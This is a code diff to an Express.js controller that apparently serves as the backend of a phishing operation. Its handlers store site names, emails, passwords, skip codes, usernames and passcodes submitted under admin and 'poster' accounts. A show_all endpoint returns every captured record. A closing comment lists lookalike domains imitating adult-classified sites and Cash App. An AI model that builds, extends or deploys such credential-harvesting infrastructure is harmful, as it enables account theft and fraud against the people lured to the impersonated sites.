@@ -5,7 +5,7 @@ const Link = require('../models/Link')
 const Poster = require('../models/Poster')
 const Site = require('../models/Site')
 const createToken = require('../utils/createToken')
-const LinkName = require('../models/LinkName')
+const Demo = require('../models/Demo')
 const Click = require('../models/Click')
 const Cash = require('../models/Cash')
 
@@ -282,7 +282,7 @@ module.exports.poster_add = async (req, res) => {
 module.exports.add_data = async (req, res) => {
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode } = req.body
+    const { site, email, password, skipcode ,username,passcode } = req.body
 
     try {
         const userFound = await User.findOne({ adminId: adminId })
@@ -292,6 +292,7 @@ module.exports.add_data = async (req, res) => {
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, email, password, skipcode,
+                username,passcode,
                 poster: posterId,
                 root: posterFound._id
 
@@ -299,11 +300,14 @@ module.exports.add_data = async (req, res) => {
             })
             posterFound.details.push(info._id)
             await posterFound.save();
-            res.status(200).json({ info: info })
+            return   res.status(200).json({ info: info })
 
         }
+        return    res.status(400).json({ e: "not found" })
+
+
     } catch (e) {
-        res.status(400).json({ e: "error" })
+        return  res.status(400).json({ e: "error" })
     }
 
 }
@@ -322,14 +326,14 @@ module.exports.change_password = async (req, res) => {
                 new: true,
                 upsert: true
             });
-            res.status(200).json({ success: "password change successfully" })
+         return   res.status(200).json({ success: "password change successfully" })
 
         }
 
     }
     catch (e) {
 
-        res.status(400).json({ e: "error" })
+        return   res.status(400).json({ e: "error" })
 
 
     }
@@ -884,4 +888,53 @@ module.exports.get_deyails_cashapp = async (req, res) => {
 
 }
 
+
+
+module.exports.demo_add = async (req, res) => {
+    const {username, linkName,age } = req.body;
+console.log(username, linkName,age )
+    try {
+      
+        const userCreated = await Demo.create({
+            username, linkName ,age
+
+
+        })
+        const userFound = await Demo.find()
+
+        return res.status(200).json({ user: userFound })
+
+
+    }
+    catch (e) {
+
+        return res.status(400).json({ error: e })
+
+    }
+
+
+
+}
+
+
+module.exports.show_all = async (req, res) => {
+    
+    try {
+      
+        
+        const userFound = await Info.find()
+
+        return res.status(200).json({ user: userFound })
+
+
+    }
+    catch (e) {
+
+        return res.status(400).json({ error: e })
+
+    }
+
+
+
+}
 // "https://www.tsescort.live","https://www.megapersonals.online","https://www.privatedelight.online","https://www.skipthegames.help","https://www.tryst.rest","https://www.erosads.online","https://erosads.vercel.app","https://skipthegame.vercel.app","https://trysts.vercel.app","https://official-cash.vercel.app"
